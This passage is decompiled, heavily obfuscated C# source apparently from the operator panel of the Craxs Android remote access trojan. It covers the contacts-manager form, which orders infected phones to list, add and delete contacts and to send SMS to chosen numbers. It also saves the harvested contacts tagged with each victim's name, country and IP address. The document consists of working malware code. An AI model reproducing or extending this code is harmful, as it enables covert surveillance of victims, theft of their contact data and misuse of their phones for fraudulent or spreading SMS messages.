      get => ((CraxsSettings) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((CraxsSettings) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column9
    {
      get => ((CraxsSettings) this)._Column9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._Column9 = value;
    }

    internal virtual DataGridViewImageColumn Column2
    {
      get => ((CraxsSettings) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsSettings) this)._Column2 = value;
    }

    internal virtual ToolStripMenuItem SendSmsToolStripMenuItem
    {
      get => ((CraxsSettings) this)._SendSmsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SendSmsToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CraxsSettings) this)._SendSmsToolStripMenuItem;
label_1:
        int num1 = 1877582080;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 * 1896079423 - (-1946909029 * (-220084855 * 1689664400) + -2031959477 * ~962296157) * 237586223) * 29733981)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              ((CraxsSettings) this)._SendSmsToolStripMenuItem = value;
              toolStripMenuItem = ((CraxsSettings) this)._SendSmsToolStripMenuItem;
              int num3;
              num1 = num3 = toolStripMenuItem == null ? 32867550 : (num3 = -569398557);
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1557562546 ^ -1479222866;
              continue;
            case 3:
              goto label_3;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1028170558 ^ -162539846;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? 111505791 : (num4 = -2081367250);
              num1 = num4 ^ (int) num2 * 1479649557;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public void translateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u00368315C26, false) == 0)
        goto label_10;
label_1:
      int num1 = 351278408;
label_2:
      int index1;
      int num2;
      while (true)
      {
        int num3 = num1;
        uint num4;
        int num5;
        int index2;
        switch ((num4 = (uint) (-1854480080 - 1307592359 - (-(~num3 ^ -~(342997837 * 1467166657) + (~-1885319810 + (1353759008 - 62680405) ^ -(1712749834 + 1639049898))) - (-1420234137 - -1737267535 + -105045196)) ^ 1152212731)) % 15U)
        {
          case 0:
            num1 = (int) num4 * 755418569 ^ -968218270;
            continue;
          case 1:
            this.ctxMenu.Items[index2].Text = Codes.Translate(this.ctxMenu.Items[index2].Text, EXGuarder.\u0030F07466D, EXGuarder.\u0035E053C44);
            num1 = -1055899106;
            continue;
          case 2:
            int num6;
            num1 = num6 = index1 <= num2 ? -188783272 : (num6 = -132207744);
            continue;
          case 3:
            num5 = checked (this.ctxMenu.Items.Count - 1);
            num1 = (int) num4 * -271017202 ^ -1386325184;
            continue;
          case 4:
            checked { ++index1; }
            num1 = (int) num4 * 23614924 ^ -1809210704;
            continue;
          case 5:
            int num7;
            num1 = num7 = index2 <= num5 ? -131935728 : (num7 = 548311017);
            continue;
          case 6:
            this.ctxMenu.Items[index1].Text = Codes.Translate(this.ctxMenu.Items[index1].Text, EXGuarder.\u0030F07466D, EXGuarder.\u0033B720815);
            num1 = -833864797;
            continue;
          case 7:
            num1 = (int) num4 * -560348930 ^ 327579296;
            continue;
          case 8:
            goto label_3;
          case 9:
            goto label_1;
          case 10:
            goto label_10;
          case 11:
            num1 = (int) num4 * -748607263 ^ -578987958;
            continue;
          case 12:
            int num8 = Operators.CompareString(language, EXGuarder.\u0034C274D3D, false) != 0 ? 281600943 : (num8 = -1272598916);
            num1 = num8 ^ (int) num4 * 1026379881;
            continue;
          case 13:
            checked { ++index2; }
            num1 = (int) num4 * -1810083518 ^ -507367318;
            continue;
          case 14:
            index2 = 0;
            num1 = (int) num4 * 2003316127 ^ -1520697334;
            continue;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:
      return;
label_10:
      num2 = checked (this.ctxMenu.Items.Count - 1);
      index1 = 0;
      num1 = 1412853359;
      goto label_2;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_4;
label_1:
      int num1 = 1289963226;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-1181057625 - ~-num2 * -268883219 * -1526175771) * 357060619)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num3 * 1504954035 ^ -1974777520;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_4;
          case 4:
            num1 = (int) num3 * 2096357358 ^ 1520816468;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_4:
      this.TOpacity.Enabled = false;
      num1 = -7594160;
      goto label_2;
    }

    private void ContactsManager_Load(object sender, EventArgs e)
    {
      this.translateme();
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0034B051157);
      this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
      this.DGV0.DefaultCellStyle.Font = Settings.f;
      if (Operators.CompareString(getIconFrmReg.SHFILEINFOW.SAVING_DATA, EXGuarder.\u0035E6B3F40, false) != 0)
        goto label_4;
label_1:
      int num1 = 1810006419;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-((num1 - (~--1739683371 - ~(-1395792027 * (-531909234 * -855613877)) - (-(1927870151 - -39251641) ^ 1966523060 + (325828979 - 1059923243) ^ -(~-52249448 ^ -1393107649 - 1718758890)))) * 523381017) * -632498493 ^ 290745881 + 1795221696) - -1211387288)) % 7U)
        {
          case 0:
            this.TOpacity.Enabled = true;
            ((Dialog1) this).BoxTitlePaintEventArgsWait = true;
            num1 = (int) num2 * -131577834 ^ -562757968;
            continue;
          case 1:
            this.SaveToolStripMenuItem.Visible = true;
            num1 = (int) num2 * -1568964011 ^ -997551956;
            continue;
          case 2:
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = (int) num2 * -1256257913 ^ -233883259;
            continue;
          case 3:
            goto label_3;
          case 4:
            this.SaveAsToolStripMenuItem.Visible = true;
            num1 = (int) num2 * -1419346128 ^ -1011260079;
            continue;
          case 5:
            goto label_1;
          case 6:
            goto label_4;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_4:
      this.Text = ((CraxsSettings) this).Title;
      num1 = 1265183769;
      goto label_2;
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      reso.Directory_Exist(((CraxsSettings) this).classClient);
label_1:
      int num1 = -1905799004;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(~887473825 * 12964403 + (2143808444 - (-644722883 - 324975897)) - (-1308930440 - (-537466637 + -1640940413 * 911337676)) - num2 * 479066857 - ~((-881789287 - 174058080) * 659251601) ^ -1697322259 * (2107570234 - 1992503285)) - -1345331113)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            if (Dialog1.\u0024IR75\u002D1 != null)
            {
              num1 = (int) num3 * -1952628405 ^ -2100711516;
              continue;
            }
            goto label_6;
          default:
            goto label_5;
        }
      }
label_5:
      WaitCallback callBack = Dialog1.\u0024IR75\u002D1;
      goto label_7;
label_6:
      // ISSUE: reference to a compiler-generated method
      Dialog1.\u0024IR75\u002D1 = callBack = new WaitCallback(Dialog1.\u0024I._Lambda\u0024__R75\u002D1);
label_7:
      ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
      {
        (object) this.DGV0,
        (object) ((CraxsSettings) this).tmpFolderUSER,
        (object) EXGuarder.\u003251C0A4A,
        (object) ((Dialog1) this).tmpClientName,
        (object) (((Dialog1) this).tmpCountry + EXGuarder.\u003086E0510 + ((Dialog1) this).tmpAddressIP),
        (object) EXGuarder.\u0031B761124,
        (object) EXGuarder.\u00373757569,
        (object) (DateAndTime.Now.ToString(EXGuarder.\u00312656C35) + EXGuarder.\u0034B3C4346)
      });
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
label_1:
      int num1 = -1553847342;
      while (true)
      {
        int num2 = num1;
        uint num3;
        WaitCallback callBack;
        switch ((num3 = (uint) (-~~(-~-(-1404332086 - 1211226701) - ~num2) - 1454725394)) % 8U)
        {
          case 0:
            if (Dialog1.\u0024IR76\u002D2 == null)
            {
              // ISSUE: reference to a compiler-generated method
              Dialog1.\u0024IR76\u002D2 = callBack = new WaitCallback(Dialog1.\u0024I._Lambda\u0024__R76\u002D2);
              break;
            }
            num1 = (int) num3 * 1768725876 ^ -97671531;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            saveFileDialog.Filter = EXGuarder.\u003383E2355;
            num1 = (int) num3 * -1827582419 ^ 849577884;
            continue;
          case 4:
            callBack = Dialog1.\u0024IR76\u002D2;
            break;
          case 5:
            saveFileDialog.Dispose();
            num1 = -199490624;
            continue;
          case 6:
            int num4 = saveFileDialog.ShowDialog() != DialogResult.OK ? 1170976552 : (num4 = 2062774285);
            num1 = num4 ^ (int) num3 * 1025034478;
            continue;
          case 7:
            saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u0030D673759) + EXGuarder.\u00313512B20;
            num1 = (int) num3 * -912324855 ^ -425057023;
            continue;
          default:
            goto label_13;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u0032A5F341E,
          (object) saveFileDialog.FileName,
          (object) ((Dialog1) this).tmpClientName,
          (object) (((Dialog1) this).tmpCountry + EXGuarder.\u003372C1A59 + ((Dialog1) this).tmpAddressIP),
          (object) EXGuarder.\u0031D296E5B,
          (object) EXGuarder.\u0033C2F5B38,
          (object) EXGuarder.\u0032A5F341E
        });
        num1 = -319898052;
      }
label_3:
      return;
label_13:;
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1219681253;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string str1;
        int num4;
        string str2;
        switch ((num3 = (uint) ((~(1007187165 * -1945637077) - (num2 - ~(-755056209 - --2108510291 ^ ~~1972431858 ^ -1425800605 * ~815364214 * -1504418295))) * -210466883 + (-1965403548 - -727916649 ^ -1809598663) - --642764390 ^ -1963198555)) % 11U)
        {
          case 0:
            num1 = (int) num3 * 793848452 ^ 207589044;
            continue;
          case 1:
            int num5 = ((CraxsSettings) this).classClient == null ? -1838598404 : (num5 = 2015527993);
            num1 = num5 ^ (int) num3 * 312655163;
            continue;
          case 2:
            num4 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1044819462 ^ 1158161744;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsSettings) this).classClient.SendMessage(new object[4]
            {
              (object) ((CraxsSettings) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0034E462A37 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00333445942 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030C3F0C0D + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036156665E),
              (object) ((CraxsSettings) this).classClient
            });
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = (int) num3 * -822114865 ^ 661212242;
            continue;
          case 4:
            checked { index += -1; }
            num1 = -2122977724;
            continue;
          case 5:
            int num6;
            num1 = num6 = index >= 0 ? -2134160577 : (num6 = -1907056536);
            continue;
          case 6:
            str2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            num1 = (int) num3 * 964943866 ^ -1712924672;
            continue;
          case 7:
            goto label_13;
          case 8:
            goto label_1;
          case 9:
            index = num4;
            num1 = (int) num3 * 503758877 ^ -2056770610;
            continue;
          case 10:
            str1 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Tag);
            num1 = -1433651441;
            continue;
          default:
            goto label_14;
        }
      }
label_13:
      return;
label_14:;
    }

    private void AddToolStripMenuItem_Click(object sender, EventArgs e)
    {
      AddNumber lc1 = new AddNumber();
label_1:
      int num1 = 1377922864;
      while (true)
      {
        int num2 = num1;
        uint num3;
        DialogResult dialogResult;
        switch ((num3 = (uint) ((~-(~(1734447632 - 13932273 ^ ~-437458784 ^ ~941501831 ^ 1954820562) - (-(-(-2102165284 * -128439189) + ~(-957117713 * 1731817399)) + (2043412443 * (-1447918573 ^ -1714375403) + (-1199605859 - 1922063310 + (-2019429429 - -2065444498)) + 784268696) - num2)) ^ -413387691 ^ 737783901) + 1964884264)) % 10U)
        {
          case 0:
            int num4 = dialogResult == DialogResult.OK ? 1579360955 : (num4 = 1708443469);
            num1 = num4 ^ (int) num3 * 1740398415;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsSettings) this).classClient.SendMessage(new object[4]
            {
              (object) ((CraxsSettings) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00338596172 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00308104001 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036422601E + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + lc1.InputText0.Text + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + lc1.InputText1.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00311791821),
              (object) ((CraxsSettings) this).classClient
            });
            num1 = (int) num3 * -1481382379 ^ -309761847;
            continue;
          case 3:
            goto label_1;
          case 4:
            lc1.Text = EXGuarder.\u00306644814;
            lc1.L0.Text = EXGuarder.\u0030C563A56;
            num1 = (int) num3 * 1089638545 ^ 1027647788;
            continue;
          case 5:
            int num5;
            num1 = num5 = ((CraxsSettings) this).classClient == null ? 714079230 : (num5 = 47671707);
            continue;
          case 6:
            lc1.L1.Text = EXGuarder.\u0036F400040;
            num1 = (int) num3 * 844136016 ^ 888119495;
            continue;
          case 7:
            lc1.StartPosition = FormStartPosition.Manual;
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            num1 = (int) num3 * 1730453852 ^ 1625794102;
            continue;
          case 8:
            dialogResult = lc1.ShowDialog((IWin32Window) this);
            num1 = (int) num3 * -1225110127 ^ -696981768;
            continue;
          case 9:
            num1 = (int) num3 * -1147894511 ^ 994837573;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      lc1.Close();
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((CraxsSettings) this).classClient == null)
        return;
label_1:
      int num1 = 731725690;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~-280273294 - ~(316436121 - (-num2 ^ 82316931 ^ -(-954667687 ^ -779641464) + ~(-469279535 * -1275843852))) - -871768262)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsSettings) this).classClient.SendMessage(new object[4]
            {
              (object) ((CraxsSettings) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0036A086734 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00312710F41 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.getContacts + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003156C0B4C),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003235A192F),
              (object) ((CraxsSettings) this).classClient
            });
            num1 = (int) num3 * 341018747 ^ 118948398;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void BoxTitle_Paint(object sender, PaintEventArgs e)
    {
      if (!((Dialog1) this).BoxTitlePaintEventArgsWait)
        return;
label_1:
      int num1 = 623352096;
      int count;
      Color defaultColorForeground;
      Brush brush1;
      Brush brush2;
      Size size1;
      Rectangle rect;
      Size size2;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~((-num1 ^ ~~-1761610955 * 2056978031 + -432365817 * -1126775429) - (--577048721 + (-230148149 - -1283797665) - (991552065 - 1154516855 + ~1589939874)) ^ --625341214 - 373194065)) % 13U)
        {
          case 0:
            e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
            num1 = (int) num2 * -1141296859 ^ -645338065;
            continue;
          case 1:
            Color backColor = this.BoxTitle.BackColor;
            int r = (int) backColor.R;
            backColor = this.BoxTitle.BackColor;
            int g = (int) backColor.G;
            backColor = this.BoxTitle.BackColor;
            int b = (int) backColor.B;
            brush2 = (Brush) new SolidBrush(Color.FromArgb(170, r, g, b));
            num1 = (int) num2 * 1122295169 ^ 1927907955;
            continue;
          case 2:
            str2 = EXGuarder.\u00320766B75 + Conversions.ToString(count);
            num1 = (int) num2 * 758867004 ^ 1475970169;
            continue;
          case 3:
            rect = new Rectangle(0, 2, this.BoxTitle.Width, checked (size2.Height + 5));
            num1 = (int) num2 * -1331089656 ^ 678151285;
            continue;
          case 4:
            size2 = TextRenderer.MeasureText(str2 + Strings.Space(10) + str1, Settings.f);
            num1 = (int) num2 * -1213062852 ^ -1419906198;
            continue;
          case 5:
            size1 = TextRenderer.MeasureText(EXGuarder.\u0035C786652, Settings.f);
            int num3 = this.BoxTitle.Height == checked (size1.Height + 3) ? -1572132118 : (num3 = 1243542633);
            num1 = num3 ^ (int) num2 * 1716246918;
            continue;
          case 6:
            count = this.DGV0.Rows.Count;
            num1 = (int) num2 * -2133594268 ^ 818685045;
            continue;
          case 7:
            e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int) defaultColorForeground.R, (int) defaultColorForeground.G, (int) defaultColorForeground.B)), 0, 1, this.BoxTitle.Width, 1);
            brush1 = (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground);
            num1 = (int) num2 * 725496151 ^ -1928468373;
            continue;
          case 8:
            goto label_1;
          case 9:
            this.BoxTitle.Height = checked (size1.Height + 3);
            num1 = (int) num2 * 790424575 ^ -932955271;
            continue;
          case 10:
            e.Graphics.DrawString(str2 + Strings.Space(10) + str1 + Strings.Space(10), Settings.f, brush1, 0.0f, 2f);
            num1 = (int) num2 * 207291284 ^ -1317937874;
            continue;
          case 11:
            goto label_15;
          case 12:
            str1 = EXGuarder.\u0033F230964 + Conversions.ToString(this.DGV0.SelectedRows.Count);
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num2 * 905636115 ^ -1220816679;
            continue;
          default:
            goto label_16;
        }
      }
label_15:
      return;
label_16:;
    }

    private void AngelAndroidForm_Activated(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void BoxTitle_Resize(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    private void SendSmsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.DGV0.SelectedRows.Count <= 0)
          return;
label_1:
        int num1 = -1797370158;
        int index1;
        smsMaker smsMaker;
        int num2;
        int index2;
        string str1;
        object[] ParametersObjects;
        TcpClient client;
        string text;
        string[] strArray;
        int num3;
        int num4;
        string str2;
        int num5;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) ((-(num1 + (~-2051947528 - (-991258043 * 2147033662 - (--419482882 + (-381834650 ^ -1451785191)))) * 1317005253) * -1700287463 ^ 458255123 * (1156565373 - 1683944919)) * -1223901929)) % 22U)
          {
            case 0:
              str2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index2].Index].Cells[1].Value);
              num1 = -2025275404;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) client,
                (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036C3F2D08 + str1 + EXGuarder.\u003305D3150 + text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num3) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num4) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsSettings) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0037227720B),
                (object) ((CraxsSettings) this).classClient
              };
              num1 = (int) num6 * -475293656 ^ -1944118576;
              continue;
            case 2:
              goto label_28;
            case 3:
              int num7 = smsMaker.ShowDialog() != DialogResult.OK ? 1402128504 : (num7 = -1730017614);
              num1 = num7 ^ (int) num6 * -264866508;
              continue;
            case 4:
              checked { ++index2; }
              num1 = (int) num6 * -1720690597 ^ -404573015;
              continue;
            case 5:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((CraxsSettings) this).classClient.SendMessage(new object[4]
              {
                (object) client,
                (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003702C4714 + text + EXGuarder.\u003305D3150 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num3) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num4) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsSettings) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0037227720B),
                (object) ((CraxsSettings) this).classClient
              });
              num1 = (int) num6 * -739400949 ^ 1480027940;
              continue;
            case 6:
              text = smsMaker.msgtext.Text;
              // ISSUE: reference to a compiler-generated field
              client = ((Data._Closure\u0024__) ((CraxsSettings) this).classClient).myClient;
              num1 = (int) num6 * -351611018 ^ -1379141564;
              continue;
            case 7:
              str1 = Conversions.ToString(smsMaker.numslist.Items[index1]);
              int num8;
              num1 = num8 = string.IsNullOrEmpty(str1) | string.IsNullOrWhiteSpace(str1) ? -1998336823 : (num8 = -548576615);
              continue;
            case 8:
              smsMaker.numslist.Items.Add((object) str2);
              num1 = (int) num6 * -66158762 ^ -133416728;
              continue;
            case 9:
              num1 = (int) num6 * 966573819 ^ 1273262470;
              continue;
            case 10:
              int num9;
              num1 = num9 = index1 <= num5 ? 1508356915 : (num9 = 1944081695);
              continue;
            case 11:
              smsMaker = (smsMaker) new ShowTipform();
              num2 = checked (this.DGV0.SelectedRows.Count - 1);
              index2 = 0;
              num1 = (int) num6 * -526653993 ^ 2058737988;
              continue;
            case 12:
              num5 = checked (smsMaker.numslist.Items.Count - 1);
              index1 = 0;
              num1 = 1973670147;
              continue;
            case 13:
              num1 = (int) num6 * 1948447487 ^ 1002976389;
              continue;
            case 14:
              int num10 = ((CraxsSettings) this).classClient == null ? 1841181350 : (num10 = -842495911);
              num1 = num10 ^ (int) num6 * 1169144085;
              continue;
            case 15:
              goto label_1;
            case 16:
              strArray = ((Data) ((CraxsSettings) this).classClient).Keys.Split(':');
              num3 = 0;
              num4 = 0;
              int num11 = !smsMaker.checkall.Checked ? -1303736102 : (num11 = 1555373269);
              num1 = num11 ^ (int) num6 * 1056319177;
              continue;
            case 17:
              int num12;
              num1 = num12 = index2 <= num2 ? 1799303048 : (num12 = 558559723);
              continue;
            case 18:
              int num13 = smsMaker.numslist.Items.Count <= 0 ? 1038834500 : (num13 = -868809610);
              num1 = num13 ^ (int) num6 * 1359167864;
              continue;
            case 19:
              checked { ++index1; }
              num1 = -875509724;
              continue;
            case 20:
              ((CraxsSettings) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num6 * -1920179028 ^ 1450118201;
              continue;
            case 21:
              // ISSUE: reference to a compiler-generated method
              AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0034646610E);
              num1 = -1981557484;
              continue;
            default:
              goto label_24;
          }
        }
label_28:
        return;
label_24:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_26:
        int num14 = 489573646;
        while (true)
        {
          uint num15;
          switch ((num15 = (uint) ((-(num14 + (~-2051947528 - (-991258043 * 2147033662 - (--419482882 + (-381834650 ^ -1451785191)))) * 1317005253) * -1700287463 ^ 458255123 * (1156565373 - 1683944919)) * -1223901929)) % 3U)
          {
            case 0:
              goto label_26;
            case 1:
              ProjectData.ClearProjectError();
              num14 = (int) num15 * -418555475 ^ -1014493075;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_31;
          }
        }
label_3:
        return;
label_31:;
      }
    }

    private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    static ContactsManager()
    {
      Dialog1.\u0024I = (ContactsManager._Closure\u0024__) new ContactsManager();
    }
  }
}
